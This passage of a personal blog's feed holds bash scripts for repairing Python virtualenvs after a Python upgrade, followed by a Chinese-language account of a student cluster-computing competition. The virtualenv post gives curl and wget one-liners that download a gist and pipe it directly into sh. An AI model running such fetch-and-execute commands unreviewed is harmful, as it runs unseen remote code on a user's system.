&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;fix_virtualenv.sh  
---  
&lt;span class="c1"&gt;#!/usr/bin/env bash  &lt;/span&gt;
&lt;span class="nv"&gt;ENV_PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;dirname &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;dirname &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;which pip&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;  
&lt;span class="nv"&gt;SYSTEM_VIRTUALENV&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;which -a virtualenv&lt;span class="p"&gt;|&lt;/span&gt;tail -1&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;  

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Ensure the root of current virtualenv:&amp;quot;&lt;/span&gt;  
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;    &lt;/span&gt;&lt;span class="nv"&gt;$ENV_PATH&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;  
&lt;span class="nb"&gt;read&lt;/span&gt; -p &lt;span class="s2"&gt;&amp;quot;‼️  Say no if you are not sure (y/N) &amp;quot;&lt;/span&gt; -n &lt;span class="m"&gt;1&lt;/span&gt; -r  
&lt;span class="nb"&gt;echo&lt;/span&gt;  
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="nv"&gt;$REPLY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;~ ^&lt;span class="o"&gt;[&lt;/span&gt;Yy&lt;span class="o"&gt;]&lt;/span&gt;$ &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;  
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;♻️  Removing old symbolic links......&amp;quot;&lt;/span&gt;  
    find &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$ENV_PATH&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; -type l -delete -print  
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;💫  Creating new symbolic links......&amp;quot;&lt;/span&gt;  
    &lt;span class="nv"&gt;$SYSTEM_VIRTUALENV&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$ENV_PATH&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;  
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;🎉  Done!&amp;quot;&lt;/span&gt;  
&lt;span class="k"&gt;fi&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Steps&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;source&lt;/span&gt; ~/.virtualenvs/&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;envname&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;/bin/activate.sh  
$ chmod u+x ./fix_virtualenv.sh  
$ ./fix_virtualenv.sh  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Script for all virtualenvs under &lt;code&gt;~/.virtualenvs&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;Based on the above script which for only one virtualenv,&lt;br /&gt;
I modified it to &lt;a href="https://gist.github.com/M157q/e1bf93a4a8170fabac24db9aee686caf"&gt;a slighty powerful script&lt;/a&gt; to fix all virtualenvs (include reinstall all modules in a virtualenv).  &lt;/p&gt;
&lt;h3&gt;One liner (Network needed)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;curl&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;sh &amp;lt;(curl -sL https://gist.githubusercontent.com/M157q/e1bf93a4a8170fabac24db9aee686caf/raw)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;wget&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;sh &amp;lt;(wget -qO- https://gist.githubusercontent.com/M157q/e1bf93a4a8170fabac24db9aee686caf/raw)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Plaintext&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;fix_virtualenvs.sh  
---  
&lt;span class="c1"&gt;#!/usr/bin/env bash  &lt;/span&gt;

&lt;span class="nv"&gt;VIRTUALENVS_ROOT_DIR&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;HOME&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;/.virtualenvs&amp;quot;&lt;/span&gt;  
&lt;span class="nv"&gt;ACTIVE_SH_PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/activate&amp;quot;&lt;/span&gt;  

&lt;span class="k"&gt;for&lt;/span&gt; dir in &lt;span class="sb"&gt;`&lt;/span&gt;find &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VIRTUALENVS_ROOT_DIR&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; -type d -maxdepth &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
&lt;span class="k"&gt;do&lt;/span&gt;  
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;dir&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VIRTUALENVS_ROOT_DIR&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;  
        &lt;span class="k"&gt;continue&lt;/span&gt;  
    &lt;span class="k"&gt;fi&lt;/span&gt;  

    &lt;span class="nb"&gt;source&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;dir&lt;/span&gt;&lt;span class="si"&gt;}${&lt;/span&gt;&lt;span class="nv"&gt;ACTIVE_SH_PATH&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;  

    &lt;span class="nv"&gt;ENV_PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;dirname &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;dirname &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;which pip&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;  
    &lt;span class="nv"&gt;SYSTEM_VIRTUALENV&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;which -a virtualenv&lt;span class="p"&gt;|&lt;/span&gt;tail -1&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;  

    &lt;span class="nb"&gt;echo&lt;/span&gt;  
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Ensure the root of current virtualenv:&amp;quot;&lt;/span&gt;  
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;    &lt;/span&gt;&lt;span class="nv"&gt;$ENV_PATH&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;  
    &lt;span class="nb"&gt;read&lt;/span&gt; -p &lt;span class="s2"&gt;&amp;quot;Say no if you are not sure (y/N) &amp;quot;&lt;/span&gt; -n &lt;span class="m"&gt;1&lt;/span&gt; -r  
    &lt;span class="nb"&gt;echo&lt;/span&gt;  
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="nv"&gt;$REPLY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;~ ^&lt;span class="o"&gt;[&lt;/span&gt;Yy&lt;span class="o"&gt;]&lt;/span&gt;$ &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;  

        &lt;span class="nb"&gt;read&lt;/span&gt; -p &lt;span class="s2"&gt;&amp;quot;Reinstall all packages of this virtualenv after upgraded? (y/N) &amp;quot;&lt;/span&gt; -n &lt;span class="m"&gt;1&lt;/span&gt; -r  


        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="nv"&gt;$REPLY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;~ &lt;span class="s2"&gt;&amp;quot;^[Yy]&lt;/span&gt;$&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;  
            &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Dump pip freeze for current virtualenv into requirements.temp&amp;quot;&lt;/span&gt;  
            pip freeze &amp;gt; requirements.temp  
        &lt;span class="k"&gt;fi&lt;/span&gt;  

        &lt;span class="nv"&gt;VIRTUALENV_PYTHON_VERSION&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;python --version&lt;span class="sb"&gt;`&lt;/span&gt;  
        &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Removing old symbolic links......&amp;quot;&lt;/span&gt;  
        find &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$ENV_PATH&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; -type l -delete -print  

        &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Creating new symbolic links......&amp;quot;&lt;/span&gt;  
        &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VIRTUALENV_PYTHON_VERSION&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;  
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="nv"&gt;$VIRTUALENV_PYTHON_VERSION&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;~ &lt;span class="s2"&gt;&amp;quot;Python 2&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;  
            &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Use Python 2 environment for this virtualenv&amp;quot;&lt;/span&gt;  
            &lt;span class="nv"&gt;$SYSTEM_VIRTUALENV&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$ENV_PATH&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; --python&lt;span class="o"&gt;=&lt;/span&gt;python2  
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="nv"&gt;$VIRTUALENV_PYTHON_VERSION&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;~ &lt;span class="s2"&gt;&amp;quot;Python 3&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;  
            &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Use Python 3 environment for this virtualenv&amp;quot;&lt;/span&gt;  
            &lt;span class="nv"&gt;$SYSTEM_VIRTUALENV&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$ENV_PATH&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; --python&lt;span class="o"&gt;=&lt;/span&gt;python3  
        &lt;span class="k"&gt;else&lt;/span&gt;  
            &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Unknown Python version of this virtualenv&amp;quot;&lt;/span&gt;  
        &lt;span class="k"&gt;fi&lt;/span&gt;  

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="nv"&gt;$REPLY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;~ &lt;span class="s2"&gt;&amp;quot;^[Yy]&lt;/span&gt;$&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;  
            &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Reinstall modules from previous dumped pip freeze result.&amp;quot;&lt;/span&gt;  
            pip install -r requirements.temp  

            &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Remove requirements.temp&amp;quot;&lt;/span&gt;  
            rm requirements.temp  
        &lt;span class="k"&gt;fi&lt;/span&gt;  
    &lt;span class="k"&gt;fi&lt;/span&gt;  

    deactivate  
&lt;span class="k"&gt;done&lt;/span&gt;  

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Done!&amp;quot;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://wirtel.be/posts/en/2014/07/29/fix_virtualenv_python_brew/"&gt;Stéphane Wirtel - Read-Eval-Print Loop&lt;/a&gt; (Dead link)  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/tevino/1a557a0c200d61d4e4fb"&gt;Fix python virtualenv after python update · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Python"></category><category term="virtualenv"></category></entry><entry><title>TSCC 2015 Notes and Thoughts</title><link href="https://blog.m157q.tw/posts/2015/09/15/tscc-2015-notes-and-thoughts/" rel="alternate"></link><published>2015-09-15T00:18:11+08:00</published><updated>2015-09-15T00:18:11+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-09-15:posts/2015/09/15/tscc-2015-notes-and-thoughts/</id><summary type="html">&lt;p&gt;又是一篇遲來的文章&lt;br /&gt;
這比賽是在今年的 6/4, 6/5 兩天比的&lt;br /&gt;
心得跟紀錄拖到現在才寫...  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;TSCC 2015 (第五屆全國學生叢集電腦競賽)&lt;br /&gt;
第一次參加，也是最後一次，&lt;br /&gt;
太晚知道這個比賽了，有點可惜。&lt;br /&gt;
這個比賽真的蠻封閉的，&lt;br /&gt;
而且又限定只有高中生和大學生可以參加，&lt;br /&gt;
研究所以上只能當領隊給予指導，不得參賽。&lt;br /&gt;
然後基本上冠軍都是清大在拿，&lt;br /&gt;
因為他們有專門的實驗室在從事這方面的研究，&lt;br /&gt;
然後也很積極的去栽培大學部的學生投入這個比賽，&lt;br /&gt;
有很多學長姊及實驗室的資源可以使用。&lt;br /&gt;
不然光是主機需要的配備以及 Infiniband 的專門網卡就要花掉幾萬元，&lt;br /&gt;
對學生來說不算小的開支，&lt;br /&gt;
但對實驗室來說不過是筆小小的經費罷了。&lt;br /&gt;
而且他們的實驗室也有好幾篇論文是在做這方面的研究，&lt;br /&gt;
總之，&lt;br /&gt;
清大投入的心力以及資源都是其他學校及不上的。  &lt;/p&gt;
&lt;p&gt;特殊的是，&lt;br /&gt;
我們這組是唯一的跨校聯隊，&lt;br /&gt;
其他組的人全部都是同校的，&lt;br /&gt;
真的覺得高中時參加的社團很神奇，&lt;br /&gt;
緣分很妙，能認識你們很榮幸。&lt;br /&gt;
雖然跨校的缺點就是很難挪出大家的共同時間一起練習，&lt;br /&gt;
但用線上討論跟遠端的環境克服倒也沒那麼困難就是。&lt;br /&gt;
明年應該也還會繼續維持跨校聯隊吧?&lt;br /&gt;
只可惜我已經畢業不能參加啦  &lt;/p&gt;
&lt;p&gt;其實整個比賽下來，感覺沒幫上什麼忙，只有各種打雜：&lt;br /&gt;
扛東西、插拔線、重開機、Debug、通靈CUDA(失敗)&lt;br /&gt;
第一天一大早，&lt;br /&gt;
一手各帶一組螢幕鍵盤滑鼠，跟 dv 共帶了三組到現場。&lt;br /&gt;
（這比賽一組六人，有 4 台 server 得操作，&lt;br /&gt;
但現場只提供一組螢幕鍵盤，也沒提供 KVM。&lt;br /&gt;
真不知道明年不是辦在新竹的話要怎麼帶這麼多鍵盤螢幕）  &lt;/p&gt;
&lt;p&gt;第一天早上會給時間進行環境安裝測試，&lt;br /&gt;
參賽者可測試自己的環境建置有沒有問題，&lt;br /&gt;
不過我們在賽前其實只有把繁瑣的操作步驟打在 Hackpad 上，&lt;br /&gt;
並沒有寫成 Script&lt;br /&gt;
所以在測試的時候我們是其他四人一人一台，&lt;br /&gt;
憑手速照著 Hackpad 上的流程建環境，&lt;br /&gt;
但這畢竟不是辦法，&lt;br /&gt;
所以我跟喜德便利用時間把伊達的安裝指南寫成一份 shell script，&lt;br /&gt;
上午的環境測試完之後，&lt;br /&gt;
四顆硬碟會被主辦單位收回，換成全新的硬碟。  &lt;/p&gt;
&lt;p&gt;下午比賽正式開始，&lt;br /&gt;
用早上臨場寫的 script 開始安裝 4 台 server ，&lt;br /&gt;
檢查了一下，&lt;br /&gt;
發現 Infiniband 的部份有問題，所以又花時間檢查了一下，&lt;br /&gt;
(結果後來發現好像是我們自己搞錯燈號...)&lt;br /&gt;
然後又遇到其中一台的硬碟有問題，&lt;br /&gt;
要求主辦單位更換另外一顆硬碟，&lt;br /&gt;
就這樣大約過了一個半小時左右&lt;br /&gt;
(其實花了比預期多蠻多時間的，讓我們有點緊張)&lt;br /&gt;
之後確定沒啥問題後，就開始燒機，&lt;br /&gt;
把 4 台共 32 核、96 GB RAM 的 servers 操到資源用光跑 HPL，&lt;br /&gt;
因為資源耗光了，也不太能在伺服器上做其他事，&lt;br /&gt;
所以就個人準備自己負責的部份，然後還有享用下午茶點，&lt;br /&gt;
約莫一個半小時跑出 345 Gflops，&lt;br /&gt;
(中間有台主機跑到一半畫面黑掉，一度以為跑到當機，&lt;br /&gt;
結果還好只是螢幕線接觸不良，虛驚一場，畢竟要重來的話時間根本不夠。)&lt;br /&gt;
後來我們自己算了一下 Gflops，大概是理論值的 92%，據說還算不錯。&lt;br /&gt;
(後來在評審時段也被證實是所有參賽八組裏面 HPL 部份最出色的)  &lt;/p&gt;
&lt;p&gt;第一天剩下的時間就拿來跑 Einstein Toolkit，&lt;br /&gt;
不過狀況似乎也不是很順利，&lt;br /&gt;
沒能在第一天結束時間前解決，遇到點小問題，得留到第二天。&lt;br /&gt;
其實這時進度有點落後了，&lt;br /&gt;
還有 LAMMPS 跟第二天才會公佈的 CUDA 題沒解決。  &lt;/p&gt;
&lt;p&gt;之後跑去參觀了一下新蓋好的原子輻射中心招待所，&lt;br /&gt;
主辦單位國網中心安排讓學校不在新竹的學生住宿在此，&lt;br /&gt;
還蠻漂亮的，雖然一進入就聞到有點刺鼻的裝潢味。&lt;br /&gt;
但因為唸交大，還是得乖乖回去住學校宿舍。  &lt;/p&gt;
&lt;p&gt;接下來就回社辦利用時間跟 dv 準備 CUDA 相關的東西，&lt;br /&gt;
希望能在第二天見到題目之前，&lt;br /&gt;
再多多惡補些 CUDA 跟平行運算相關的知識。&lt;br /&gt;
大概到半夜3點多才睡吧。&lt;br /&gt;
(其中意外發現PTT上有一個還不錯的 CUDA 入門系列，&lt;br /&gt;
整理在這 &lt;a href="https://m157q.github.io/posts/2015/08/15/nice-series-of-cuda-tutorials-on-ptt-cc/"&gt;Nice Series of CUDA Tutorials on ptt.cc | Just for noting&lt;/a&gt;)  &lt;/p&gt;
&lt;p&gt;隔天一早9點，又到國網中心繼續第二天的比賽，&lt;br /&gt;
小趴和喜德繼續處理昨天的 Einstein Toolkit 問題，&lt;br /&gt;
divazone 則是準備他負責的 LAMMPS 部份，&lt;br /&gt;
我跟 dv 還有伊達則是在 CUDA 題目公佈後就開始著手研究 CUDA 的部份。&lt;br /&gt;
最後 Einstein Toolkit 跟 LAMMPS 的部份我記得是都有跑出來，&lt;br /&gt;
但結果好像普通。&lt;br /&gt;
但 CUDA 的部份我們把想法和改好的程式碼下去跑，&lt;br /&gt;
就是跑不出預期的結果，所以沒有成功。&lt;br /&gt;
(果然只靠前一天惡補是不靠譜的啊)  &lt;/p&gt;
&lt;p&gt;比賽到中午結束，&lt;br /&gt;
吃完午餐後便開始一組一組的評審面試問答。&lt;br /&gt;
輪到我們這組的時候，&lt;br /&gt;
果不其然，評審都對我們為什麼採用 &lt;a href="https://www.scientificlinux.org/"&gt;Scientific Linux 7&lt;/a&gt; 很好奇&lt;br /&gt;
因為其他組都使用一個月前賽前解說提供的環境 Cent OS 6 or 7  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Scientific Linux 是從 Red Hat Enterprise Linux 衍生的 distro，&lt;br /&gt;
由歐洲核子研究組織(CERN) 中的費米實驗室(Fermilab) 主持，&lt;br /&gt;
提供一個專門用於科學運算的 Linux Distro，&lt;br /&gt;
更多相關資訊可以參考&lt;br /&gt;
&lt;a href="https://www.scientificlinux.org/about/"&gt;About | Scientific Linux&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我們便把這個主要原因向評審們說明，&lt;br /&gt;
以及一些採用 Intel 的商用 compiler icc 而不是使用 gcc 等等的一些細節。&lt;br /&gt;
然後還有其他幾題的思路以及為什麼沒有跑出結果的原因。&lt;br /&gt;
評審時間大概歷時 10 ~ 15 分鐘左右就結束了。&lt;br /&gt;
所有組都報告完後，&lt;br /&gt;
所有參賽者跟領隊還有國網中心的工作人員都集中到一間視聽教室，&lt;br /&gt;
然後開始一個算是頒獎前的所有人的討論時間，&lt;br /&gt;
評審先就所有題目的解法大略講過一遍，&lt;br /&gt;
(發現我們對於 CUDA 題原先的想法跟評審公佈的相同，&lt;br /&gt;
但我們考慮的太多，把題目想的太難，&lt;br /&gt;
一方面也是跟 CUDA 不夠熟，所以沒寫出來)&lt;br /&gt;
然後有任何問題或建議都可以提出來，&lt;br /&gt;
提問的狀況蠻熱烈的就是，&lt;br /&gt;
我偷偷提了個冷氣環境的要求，&lt;br /&gt;
在國網中心的大廳忍受一堆 CPU 燒到 100% 和 GPU 的廢熱實在是很熱呀，&lt;br /&gt;
相較於在系計中碰機器的時候都是在十幾度的冷氣環境下，&lt;br /&gt;
身為一個怕熱的肥宅實在有點無法忍受就是。  &lt;/p&gt;
&lt;p&gt;熱烈的討論時間之後就是頒獎時間。&lt;br /&gt;
頒獎的人我也記不太得，&lt;br /&gt;
最後我們拿到佳作，&lt;br /&gt;
雖然沒有拿到我們賽前希望的前三名，&lt;br /&gt;
但畢竟初出茅廬，這樣的成績也還算不錯啦。&lt;br /&gt;
真的感謝隊友們。  &lt;/p&gt;
&lt;p&gt;其實比賽結束完後，&lt;br /&gt;
在竹科裡的托斯卡尼尼餐廳有個慶功宴，&lt;br /&gt;
但我因為當 SA 的助教，&lt;br /&gt;
剛好那天晚上得講課，&lt;br /&gt;
只好放棄吃慶功宴，&lt;br /&gt;
比賽結束後，把設備拿回社辦，&lt;br /&gt;
稍微備課一下後，晚餐也沒吃就跑去上課了&lt;br /&gt;
但因為沒吃過托斯卡尼尼的餐點，&lt;br /&gt;
所以請 dv 幫我外帶回交大，&lt;br /&gt;
上完課後9點多才吃XD  &lt;/p&gt;
&lt;p&gt;最後附上一張四校聯隊的參賽證跟獎牌&lt;br /&gt;
&lt;img alt="TSCC 2015 badge &amp;amp; medal" src="/files/thought-about-tscc-2015/TSCC2015.jpg" /&gt;&lt;br /&gt;
希望明年可以有更好的成績呢  &lt;/p&gt;
&lt;p&gt;噢 對了 還得感謝小飛機的指導&lt;br /&gt;
沒有他的話，我大概也不會知道這個比賽。&lt;br /&gt;
附上他當年參賽的心得文 &lt;a href="http://blog.night9.cc/tscc/"&gt;TSCC 個人心得&lt;/a&gt;&lt;br /&gt;
還得感謝交大資工系計中&lt;br /&gt;
借了兩張 Infiniband 網卡跟網路線&lt;br /&gt;
不然我們應該沒辦法在事前碰到 Infiniband  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;以下是這次官方發佈的參賽內容:  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://event.nchc.org.tw/2015/tscc/"&gt;http://event.nchc.org.tw/2015/tscc/&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;TSCC (Taiwan Student Cluster Competition) 由台灣國家高速網路中心（簡稱國網中心）舉辦的台灣全國學生叢集電腦競賽，限高中生與大學生參加（研究生不可參加，但可擔任教練）。  &lt;/p&gt;
&lt;p&gt;以前都只有耳聞這個比賽，但沒參加，大學最後一年，因為一些緣分，和高中社團認識的一些人組成了一支橫跨中央、交大、中教大、竹教大的四校聯隊，不知道是不是這比賽第一支聯隊，因為這比賽通常是以校為單位組隊，主要原因是因為高效運算需要的設備成本對學生來說並不便宜，以校為單位的隊伍比較容易向學校申請一些相關經費，為校爭光等等之類的。而清大在這比賽一直是衛冕者，主要是因為他們在這方面真的投入蠻多心力的。  &lt;/p&gt;
&lt;p&gt;因為以前沒碰過高效運算、平行運算或是叢集運算這方面的東西，想說藉著比賽讓自己學習也未嘗不是件好事，但沒碰過就比較辛苦一點，一堆專有名詞都不太懂，只好寫下來紀錄一下。  &lt;/p&gt;
&lt;p&gt;2015 的決賽內容:  &lt;/p&gt;
&lt;h3&gt;LAMMPS&lt;/h3&gt;
&lt;p&gt;LAMMPS主要是由美國能源部Sandia National Laboratories所開發之GNU開放軟體(open source)，它是一個以古典分子動力學為主的模擬應用程式，並附有蒙地卡羅、耗散粒子動力學等模擬方法，可模擬包含液態、氣態、固態、膠質等不同物質之結構、動力學、力學、…等微觀材料物性質之軟體，尺度可模擬數百至數十億顆原子。LAMMPS更支援個人電腦、大型平行運算主機、或GPU顯卡等設施執行運算，編譯之程式為C + +，並支持MPI、OpenMP與CUDA程式。並且是一個被設計成易於修改或擴展新的原始碼，因此可讓使用者免費使用或修改。  &lt;/p&gt;
&lt;p&gt;LAMMPS網址為: &lt;a href="http://lammps.sandia.gov/"&gt;http://lammps.sandia.gov/&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Einstein toolkit&lt;/h3&gt;
&lt;p&gt;Einstein toolkit為一求解初值邊界問題的開源科學模擬程式。主要應用在強重力場下的極端天文物理研究，如黑洞的形成及演化、中子星與黑洞碰撞、重力波計算等其他廣義的相對論磁流體系統，以提供未來重力波相關天文觀測所需要的理論模型。Einstein toolkit 基於Cactus 的插件式設計，支援MPI、OpenMP 以及向量擴展指令集，提供一般模擬過程所需要的元件，如高階有限差分、顯式時間演化積分、結構化自適應網格(structured adaptive mesh refinement)等，而研究者可著重在科學插件的撰寫與組合，控制模擬流程，充分發揮高速計算主機效能。目前主要的開發者為美國、德國、與加拿大的數值相對論研究群。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://einsteintoolkit.org/"&gt;Einstein toolkit&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://cactuscode.org/"&gt;Cactus Framework&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;多核心高效能程式調教&lt;/h3&gt;
